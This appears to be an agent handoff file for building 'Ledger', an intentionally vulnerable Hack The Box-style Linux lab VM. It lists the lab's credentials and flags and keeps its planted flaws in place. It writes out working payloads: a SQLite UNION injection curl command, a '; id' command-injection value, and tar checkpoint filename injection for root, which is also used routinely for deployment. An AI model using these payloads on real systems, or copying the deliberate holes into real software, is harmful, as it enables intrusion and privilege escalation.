# Machine Building — agent handoff

## Scope

These instructions apply to everything under `machine_building/`. The active
project is `easy-linux/`, an intentionally vulnerable Hack The Box-style Linux
machine named **Ledger**. Preserve the intended vulnerabilities; do not “fix”
them as ordinary production security bugs.

The local project is the source of truth. The live VM is a test deployment used
to validate changes before an eventual OVA export.

## Current live VM

| Item | Value |
|---|---|
| IP | `10.1.201.51` |
| Hostname | `ledger` |
| Domain | `ledger.htb` |
| OS actually installed | Ubuntu Server 26.04 LTS (Resolute), amd64 |
| Web | `http://10.1.201.51/` or `http://ledger.htb/` |
| Exposed ports | `22/tcp`, `80/tcp` |
| VM sizing target | 2 vCPU, 2 GB RAM, 12 GB dynamic disk |

For local name resolution:

```bash
echo '10.1.201.51 ledger.htb' | sudo tee -a /etc/hosts
```

The original build account `skip` was deleted at finalization. Do not expect
`skip@10.1.201.51` to work. Root SSH login is disabled.

## Laboratory credentials and flags

These are challenge credentials, not personal or production credentials.

| Purpose | Username | Password / value |
|---|---|---|
| Temporary build account, now deleted | `skip` | `azerty` |
| Web administrator | `reports-admin` | `sunshine` |
| Player SSH account | `mira` | `AutumnReports!2026` |
| Root console / local `su` fallback | `root` | `G7!vQ2@xN9#kR4$zT8&mP6_Wc` |
| Flask session key | n/a | `ledger-session-key-change-before-freeze` |
| User flag | `/home/mira/user.txt` | `4d186321c1a7f0f354b297e8914ab240` |
| Root flag | `/root/root.txt` | `8f14e45fceea167a5a36dedd4bea2543` |

SSH command for maintenance/testing:

```bash
ssh -o PubkeyAuthentication=no -o PreferredAuthentications=password mira@10.1.201.51
```

For `sudo -l`, use `/usr/bin/sudo --list` if a local interactive terminal adds
unexpected shell state. A clean Mira session reports:

```text
(root) NOPASSWD: /usr/local/sbin/ledger-backup
```

## Intended exploitation path

1. Inspect the login page and `/static/login.js`.
2. Discover `/api/v1/directory/search?name=...`.
3. Use a two-column SQLite `UNION` injection to extract the administrator SHA-256 hash:

   ```bash
   curl -sG \
     --data-urlencode "name=' UNION SELECT username,password_hash FROM users-- " \
     http://ledger.htb/api/v1/directory/search
   ```

4. Crack the hash with Hashcat mode 1400 and `rockyou.txt`; it resolves to `sunshine`.
5. Log in as `reports-admin` and navigate to Imports → Legacy Archive → Diagnostics.
6. Inject a command into the diagnostic host field, for example `127.0.0.1; id`.
7. From the `ledger` RCE, read `MIRA_IMPORT_USER` and `MIRA_IMPORT_PASSWORD` from the process environment.
8. SSH as `mira`, read `user.txt`, inspect the `archive-ops` group and follow
   `/etc/ledger/archive.conf` to `/var/spool/ledger/nightly`.
9. Abuse GNU tar checkpoint options through filenames in that nightly queue to execute as root.

The complete internal validation path is in `easy-linux/writeup.md`. It is not a
submission-ready document. HTB currently prohibits AI-generated submission
write-ups; the human author must recreate the final documentation and screenshots.

## Intentional vulnerabilities — do not remove

- SQL injection in `GET /api/v1/directory/search`.
- Crackable unsalted SHA-256 password hash for `reports-admin` (`sunshine` is in `rockyou.txt`).
- Authenticated command injection in `POST /admin/diagnostics`.
- `MIRA_IMPORT_PASSWORD` present in the gunicorn service environment.
- Password reuse between the legacy importer secret and the `mira` Unix account.
- `mira` may run `/usr/local/sbin/ledger-backup` as root without a password.
- The backup script loads a root-controlled, `archive-ops`-readable profile and
  executes `tar ... *` in the group-writable nightly queue, enabling tar option injection.

Avoid adding alternative shortcuts such as world-readable flags, Docker/LXD
membership, extra sudo rules, dangerous capabilities, exploitable SUID files or
an unauthenticated command-execution path.

## Repository map

- `easy-linux/app/`: Flask application, Jinja templates, CSS and login JavaScript.
- `easy-linux/provision/install.sh`: full build/provision script.
- `easy-linux/provision/ledger.service`: gunicorn systemd unit.
- `easy-linux/provision/nginx-ledger.conf`: nginx reverse proxy.
- `easy-linux/provision/ledger-backup`: intentional root escalation path.
- `easy-linux/tests/static-checks.sh`: local syntax/static checks.
- `easy-linux/tests/verify-vm.sh`: root-level validation on a provisioned VM.
- `easy-linux/tests/acceptance.md`: manual acceptance checklist.
- `easy-linux/docs/`: build, requirements, design and installation notes.
- `easy-linux/writeup.md`: internal walkthrough only.

## Local validation

From `machine_building/`:

```bash
./easy-linux/tests/static-checks.sh
```

At minimum, preserve these behaviours after application changes:

- public pages and `/static/style.css`/`login.js` return HTTP 200;
- direct-IP and unknown-Host requests return 302 to `http://ledger.htb`, while
  the `ledger.htb` vhost returns the application;
- private dashboard routes redirect to `/login` without a session;
- the old login payload `' OR 1=1 --` does not authenticate;
- the directory `UNION` injection returns the 64-character admin hash;
- login with `reports-admin:sunshine` succeeds;
- diagnostic injection executes as `ledger`;
- SSH as `mira` works;
- tar option injection reaches root;
- only ports 22 and 80 are exposed.

## Updating the live VM

Because `skip` and direct root access are gone, application updates are normally
staged with `mira` and installed through the intentional tar escalation. Do not
leave deployment artifacts in the challenge directory.

1. Copy the updated app to a unique temporary path:

   ```bash
   scp -o PubkeyAuthentication=no -o PreferredAuthentications=password \
     -r easy-linux/app mira@10.1.201.51:/tmp/ledger-app-update
   ```

2. As `mira`, create a short deployment script inside `/opt/ledger/reports` that
   copies `app.py`, templates and static assets into `/opt/ledger/app`, restores
   `ledger:ledger` ownership, restarts `ledger.service`, and removes the staged
   `/tmp` directory.
3. Trigger it with the intended filenames in `/var/spool/ledger/nightly`:

   ```bash
   touch -- '--checkpoint=1'
   touch -- '--checkpoint-action=exec=sh deploy.sh'
   sudo /usr/local/sbin/ledger-backup
   ```

4. Remove `deploy.sh` and both `--checkpoint*` files. Confirm that the nightly
   queue contains only `approved-q3-summary.txt`.
5. Re-test public pages, authentication, dashboard routes and RCE.

Never copy `writeup.md`, `provision/install.sh`, flags or the whole source tree
into the final VM. Do not rerun the full installer on the current live VM unless
the user explicitly requests reprovisioning; it recreates the database, resets
credentials and touches networking.

## Current implementation notes

- Public site: `/`, `/company`, `/careers`, `/handbook`, `/service-notices`,
  `/login`.
- Public world-building: `/careers` explicitly says the partner domain is not
  hosted on the box; `/api/v1/legacy/status` points players back to the intended
  directory API so it is not a dead-end rabbit hole.
- Dashboard: `/reports`, `/admin/imports`, `/admin/diagnostics`, `/admin/audit`, `/admin/settings`.
- nginx listens on 80 and proxies to gunicorn on `127.0.0.1:8000`.
- nginx's default vhost redirects IP/unknown-host requests to `http://ledger.htb`;
  only the `ledger.htb` vhost proxies to Flask.
- Flask data: `/opt/ledger/data/ledger.db`.
- Service secrets: `/etc/ledger/ledger.env`, mode `0640`, owner `root:ledger`.
- UFW denies incoming traffic except 22/tcp and 80/tcp.
- Networking uses native `systemd-networkd` DHCP in
  `/etc/systemd/network/10-ledger-dhcp.network`; residual static Netplan YAML is
  removed.
- Histories for player/root are symlinked to `/dev/null`.
- The live site and intended chain were validated after the latest SQLi change.
- Lore hardening (12 Oct 2026): the notices now seed the shared importer
  credential story ("Legacy importer credential rotation pending", 12 September
  2026) and tighten the archive-rotation wording; `/handbook` tells analysts the
  nightly sweep is owned by the night-operations maintenance script. Both
  templates are deployed on the live VM and covered by `verify-vm.sh` checks.
- Privesc refinement (19 Oct 2026): `ledger-backup` now reads the root-controlled,
  group-readable `/etc/ledger/archive.conf` and archives
  `/var/spool/ledger/nightly`. Mira belongs to `archive-ops`, which can populate
  that queue but cannot modify the profile. Files placed in
  `/opt/ledger/reports` no longer reach privileged tar. The live VM and local
  sources both use this layout. On Ubuntu 26.04 `/tmp` is mounted `nosuid`; use
  `/home/mira/.ledger-rootbash` for the validation SUID payload.
- Permission refinement (20 Oct 2026): `/etc/ledger` is `root:root 0755` so a
  player can enumerate `archive.conf`; file-level modes still protect it as
  `root:archive-ops 0640` and protect `ledger.env` as `root:ledger 0640`.
- Terminal compatibility (20 Oct 2026): the sudoers fragment narrowly keeps
  `TERMINFO` for Mira because some SSH terminal integrations explicitly pass
  it to sudo. Do not replace this with the broad `SETENV` tag; that would create
  an unintended environment-based root shortcut.
- State reset (20 Oct 2026): `provision/ledger-scrub` runs once at the end of
  installation. It restores `/opt/ledger/reports` and
  `/var/spool/ledger/nightly`, removes player/test payloads, preserves Mira's
  flag and standard login dotfiles, then removes its temporary canonical seed.
  No periodic scrub service or timer is shipped.

## Deployment IP note

During testing the VM answered on `10.1.201.51`; `10.1.200.51` was unreachable
from the operator host at that time. The deployment address can therefore vary
between sessions: re-scan the host-only network (or check the VM console) and
update the IP in this file when it changes. Re-confirmed on 12 October 2026:
`10.1.201.51` answered on 22/tcp and 80/tcp only, `ledger.htb` resolved.

Final live validation on 22 October 2026 after a clean reinstall: Ubuntu
26.04.1 and all phased updates were applied; the 15 GiB virtual disk satisfies
the HTB maximum; the complete SQLi-to-RCE-to-Mira-to-tar/root chain and every
`verify-vm.sh` check passed. The temporary `skip` account/home, exploit payloads,
verification script and provisioning sources were removed. Direct `sudo -l`
works for Mira, and the 25-character local root fallback was verified with
`su -`; SSH root login remains disabled. An OVA export/import cold-start
validation is still required before submission.

Final export validation on 31 October 2026: the machine was rebuilt from a
fresh Ubuntu 26.04.1 install, fully updated, finalized, and reduced from an
initial non-compliant 20 GiB VDI to a healthy 15 GiB VDI. The complete intended
chain and every `verify-vm.sh` check passed both on the source VM and after a
cold import of `Ledger.ova`. The source VM is named `Ledger`, powered off, and
has no NAT port-forward, shared folder, USB, audio, mounted ISO, clipboard, or
drag-and-drop integration. The validated export is `/home/skip/Documents/htb/Ledger.ova`
with SHA-256 `052c013549d6a057cb27c53d6839dfc3d1897d22bc8fc8641f1701de6d1534b7`.

## Change discipline

- Use `apply_patch` for source edits.
- Keep the interface realistic, responsive and English-language.
- Buttons without backend behaviour should be visibly disabled or marked
  unavailable; do not create misleading rabbit holes.
- Keep the intended path clear enough for an upper-Easy machine. If adding steps,
  update `README.md`, `docs/design.md`, `tests/acceptance.md`, `tests/verify-vm.sh`
  and `writeup.md` together.
- Run static checks before deployment and clean every test/deployment artifact.
- Do not reboot, delete accounts, alter networking, regenerate flags or export an
  OVA without explicit user authorization.
